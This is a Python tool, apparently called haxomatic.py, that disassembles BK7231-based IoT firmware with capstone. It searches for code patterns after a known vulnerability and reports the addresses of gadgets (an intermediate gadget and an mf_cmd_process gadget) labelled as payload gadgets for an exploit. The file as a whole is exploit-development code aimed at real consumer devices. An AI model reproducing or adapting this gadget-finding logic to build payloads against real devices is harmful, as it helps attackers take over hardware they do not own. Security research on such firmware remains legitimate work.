import bisect
import itertools
import struct
import sys
from collections import deque, namedtuple
from typing import Callable, List

import capstone.arm as arm
from capstone import *

CodePatternMatch = namedtuple("CodePatternMatch", "matched_instructions start_address start_offset")
SentinelInstruction = namedtuple("SentinelInstruction", "address size")

class CodePatternFinder(object):
    def __init__(self, code: bytes, base_address: int = 0):
        self.code = code
        self.base_address = base_address
        self.thumb_cache = self.__build_cache(thumb_mode=True)
        self.arm_cache = self.__build_cache(thumb_mode=False)

    def search(self, condition_lambdas: List[Callable[[CsInsn, int], bool]], start_address: int = None, thumb_mode: bool = True, stop_at_first: bool = True, after_match_count: int = None) -> List[CodePatternMatch]:
        cache = self.thumb_cache if thumb_mode else self.arm_cache
        wordsize = self.__get_wordsize(thumb_mode)

        if start_address is None:
            start_address = self.base_address

        if start_address < self.base_address:
            raise ValueError(f"Starting address {start_address:#x} cannot be less than base address {self.base_address:#x}")

        if start_address > self.base_address + len(self.code):
            raise ValueError(f"Starting address {start_address:#x} is higher the end of code address")

        if (start_address % wordsize) != 0:
            raise ValueError(f"Start address must be aligned to word size {wordsize}")

        bisect_cache = list(i.address for i in cache)
        start_offset = bisect.bisect(bisect_cache, start_address)
        workinglist = deque(cache[start_offset:])

        matches = []
        while workinglist:
            invocation_list = list(itertools.islice(workinglist, 0, len(condition_lambdas)))
            invocations = [not isinstance(i, SentinelInstruction) and l(i, i.address - self.base_address) for i, l in zip(invocation_list, condition_lambdas)]
            if all(invocations):
                matched_address = invocation_list[0].address
                matched_offset = matched_address - self.base_address
                matched_instructions = invocation_list if after_match_count is None else list(itertools.islice(workinglist, 0, len(condition_lambdas) + after_match_count))
                match = CodePatternMatch(matched_instructions=matched_instructions, start_address=matched_address, start_offset=matched_offset)
                if stop_at_first:
                    return [match]
                else:
                    matches.append(match)

            workinglist.popleft()
        
        return matches

    def bytecode_search(self, bytecode: bytes, stop_at_first: bool = True):
        offset = self.code.index(bytecode, 0)
        if offset == -1:
            return []

        matches = [self.base_address + offset]
        if stop_at_first:
            return matches

        offset = self.code.index(bytecode, offset+1)
        while offset != -1:
            matches.append(self.base_address + offset)
            offset = self.code.index(bytecode, offset+1)

        return matches

    def __build_cache(self, thumb_mode: bool):
        mode = CS_MODE_THUMB if thumb_mode else CS_MODE_ARM
        md = Cs(CS_ARCH_ARM, mode)
        md.detail = True
        wordsize = self.__get_wordsize(thumb_mode)

        cache = []
        offset = 0
        sentinel_size = 0
        while offset < len(self.code):
            address = offset + self.base_address
            instrs = list(md.disasm(self.code[offset:], offset=address))
            increment = sum((i.size for i in instrs)) or wordsize
            if instrs:
                cache.extend(instrs)
                if sentinel_size:
                    cache.append(SentinelInstruction(address=(address-sentinel_size), size=sentinel_size))
                    sentinel_size = 0
            else:
                sentinel_size += wordsize
            offset += increment

        return cache

    def __get_wordsize(self, thumb_mode: bool):
        return 2 if thumb_mode else 4

def walk_app_code(appcode: bytes):
    # TODO: maybe match here already on strings in the binary?
    if b'wifisdk_for_bk7231/project' in appcode:
        pass # 970715 - older sdk
    elif b'EmbedSDKs/ty_iot_wf_bt_sdk_bk' in appcode:
        pass # newer sdk
    elif b'udp_ap_v3' in appcode:
        pass # CB3S / BK7231N stuff
    else:
        raise RuntimeError('Unknown appcode provided')

    APPCODE_START_ADDRESS = 0x10000
    print("[!] Loading and disassembling code - may take a moment")
    matcher = CodePatternFinder(appcode, APPCODE_START_ADDRESS)
    print("[+] Code loaded!")

    print("[!] Searching for post-vuln code patterns")

    # Works for the BK7231N and the newer sdk stuff
    post_vuln_pattern = [
        lambda i0, _: i0.id == arm.ARM_INS_ADD and i0.operands[1].imm == 0xfc,
        lambda i1, _: i1.id == arm.ARM_INS_LDR and i1.operands[0].reg == arm.ARM_REG_R3 and len(i1.operands) > 1 and i1.operands[1].mem.disp == 0x50,
        lambda i2, _: i2.id in [arm.ARM_INS_LDR, arm.ARM_INS_ADD, arm.ARM_INS_SUB] and i2.operands[0].reg in [arm.ARM_REG_R0, arm.ARM_REG_R1],
        lambda i3, _: i3.id in [arm.ARM_INS_LDR, arm.ARM_INS_ADD, arm.ARM_INS_SUB] and i3.operands[0].reg in [arm.ARM_REG_R0, arm.ARM_REG_R1],
    ]

    match = matcher.search(condition_lambdas=post_vuln_pattern, thumb_mode=True, stop_at_first=False)
    if not match:
        raise RuntimeError("No matching post-vuln code patterns found")

    if len(match) > 1:
        raise RuntimeError("More than one post-vuln code pattern found. Unable to continue")


    match = match[0]
    print("[+] Found a post-vuln code pattern match!")
    print("[+] Matched instructions: ")

    for mi in match.matched_instructions:
        print(f"\t{mi.address:#x}: {mi.mnemonic} {mi.op_str}")
        if mi.id == arm.ARM_INS_LDR and mi.operands[0].reg == arm.ARM_REG_R3:
            ldr_r3 = mi

    lan_obj_reg = ldr_r3.operands[1].reg

    print(f"[+] Identified lan object register as {ldr_r3.reg_name(lan_obj_reg)}")
    print(f"[!] Searching for JSON object register")

    json_delete_pattern = [
        lambda i0, _: i0.id in [arm.ARM_INS_SUB, arm.ARM_INS_ADD] and len(i0.operands) > 2 and i0.operands[0].reg == arm.ARM_REG_R0 and i0.operands[2].imm == 0,
        lambda i1, _: i1.id == arm.ARM_INS_BL
    ]

    json_delete_start_address = match.matched_instructions[-1].address - 2
    json_delete_matches = matcher.search(condition_lambdas=json_delete_pattern, start_address=json_delete_start_address, thumb_mode=True, stop_at_first=True)
    if not json_delete_matches:
        raise RuntimeError("Failed to find a reference to the JSON object register - no code matches")

    adds_r0_json_obj = json_delete_matches[0].matched_instructions[0]
    if abs(adds_r0_json_obj.address - json_delete_start_address) >= 10:
        raise RuntimeError(f"Failed to find a reference to the JSON object register - first code match address {adds_r0_json_obj.address:#x} is too far away from post-vuln invocation")

    json_obj_reg = adds_r0_json_obj.operands[1].reg
    json_obj_reg_name = adds_r0_json_obj.reg_name(json_obj_reg)
    print(f"[+] Identified JSON object register as {json_obj_reg_name}")

    print("[!] Searching for ty_cJSON_Parse function address")
    ty_cjson_parse_code = bytes.fromhex("002108b50a1cfff7cbff08bd")
    ty_cjson_parse_matches = matcher.bytecode_search(ty_cjson_parse_code, stop_at_first=True)
    if not ty_cjson_parse_matches:
        raise RuntimeError("Failed to find ty_cJSON_Parse")

    ty_cjson_parse_addr = ty_cjson_parse_matches[0]
    print(f"[+] ty_cJSON_Parse address: {ty_cjson_parse_addr:#x}")

    cjson_parse_invoke_pattern = [
        lambda i0, _: i0.id == arm.ARM_INS_BL and i0.operands[0].imm == ty_cjson_parse_addr
    ]

    cjson_parse_invocations = matcher.search(condition_lambdas=cjson_parse_invoke_pattern, stop_at_first=False, after_match_count=1)
    if not cjson_parse_invocations:
        raise RuntimeError("Failed to find any ty_cJSON_Parse invocations")

    print("[!] Searching for mf_cmd_process gadget address")

    mf_cmd_gadget_addr = None
    # These tests fail for the BK7231N stuff
    # which seems to not have any debugging strings
    # maybe another pattern is more useful - say match on the loop construct
    # if the branch is taken & json object is not null
    for invocation in cjson_parse_invocations:
        ldr_inst = invocation.matched_instructions[-1]
        if ldr_inst.id == arm.ARM_INS_LDR and ldr_inst.operands[1].reg == arm.ARM_REG_PC:
            loaded_offset = (ldr_inst.operands[1].mem.disp + ldr_inst.address + 4) - APPCODE_START_ADDRESS
            if loaded_offset > 0 and loaded_offset < len(appcode):
                loaded_offset = struct.unpack("<I", appcode[loaded_offset:loaded_offset+4])[0] - APPCODE_START_ADDRESS
                if loaded_offset > 0 and loaded_offset < len(appcode):
                    first_nullbyte = appcode.index(b'\x00', loaded_offset)
                    try:
                        decoded = appcode[loaded_offset:first_nullbyte].decode('utf-8')
                        if 'mf_test.c' in decoded:
                            mf_cmd_gadget_addr = ldr_inst.address + 1
                            break
                    except UnicodeError:
                        pass
    
    if mf_cmd_gadget_addr is None:
        raise RuntimeError("Failed to find the mf_cmd_process gadget address")

    print(f"[+] mf_cmd_process gadget address (THUMB): {mf_cmd_gadget_addr:#x}")

    print(f"[!] Searching for a mov r0, {json_obj_reg_name} intermediate gadget")
    

    fixup_gadget_pattern = [
        lambda i0, _: i0.id == arm.ARM_INS_LDR and i0.operands[0].reg == arm.ARM_REG_R3 and i0.operands[1].reg == lan_obj_reg and i0.operands[1].mem.disp == 0 and i0.operands[1].mem.index == 0,
        lambda i1, _: i1.id in [arm.ARM_INS_SUB, arm.ARM_INS_ADD] and len(i1.operands) > 2 and i1.operands[0].reg == arm.ARM_REG_R0 and i1.operands[1].reg == json_obj_reg and i1.operands[2].imm == 0,
        lambda i2, _: i2.id == arm.ARM_INS_BLX and i2.operands[0].reg == arm.ARM_REG_R3
    ]

    fixup_matches = matcher.search(condition_lambdas=fixup_gadget_pattern, thumb_mode=True, stop_at_first=True)
    if not fixup_matches:
        raise RuntimeError("Could not find a valid intermediate gadget")

    intermediate_gadget = fixup_matches[0]
    print(f"[+] Found usable intermediate gadget at address {intermediate_gadget.start_address:#x}:")
    for mi in intermediate_gadget.matched_instructions:
        print(f"\t{mi.address:#x}: {mi.mnemonic} {mi.op_str}")

    intermediate_gadget_addr = intermediate_gadget.start_address + 1

    print(f"[+] Payload gadgets (THUMB): {intermediate_gadget_addr=:#x} {mf_cmd_gadget_addr=:#x}")

if __name__ == '__main__':
    if not sys.argv[1:]:
        print('Usage: python haxomatic.py <app code file>')
        sys.exit(1)

    appcode_path = sys.argv[1]
    with open(appcode_path, 'rb') as fs:
        appcode = fs.read()
        walk_app_code(appcode)
